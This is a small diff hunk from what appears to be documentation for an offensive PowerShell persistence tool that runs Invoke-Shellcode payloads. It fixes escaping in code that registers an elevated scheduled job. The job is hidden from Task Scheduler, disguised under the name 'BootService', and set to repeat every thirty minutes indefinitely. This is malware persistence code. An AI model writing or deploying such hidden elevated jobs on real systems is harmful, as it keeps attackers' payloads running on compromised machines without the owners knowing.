@@ -98,7 +98,7 @@ This will execute the persistence script using Invoke-Shellcode as the payload f
        $Option = New-ScheduledJobOption -RunElevated -RequireNetwork -ContinueIfGoingOnBattery -StartIfOnBattery -HideInTaskScheduler
        $Trig = New-JobTrigger -Once -At "7:00 AM" -RepeatIndefinitely -RepetitionInterval "00:30:00"
        $scriptblock = [scriptblock]::Create($script)
-       Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger `$Trig -ScheduledJobOption `$Option -RunNow
+       Register-ScheduledJob -Name BootService -ScriptBlock $scriptblock -Trigger $Trig -ScheduledJobOption $Option -RunNow
 
 
 
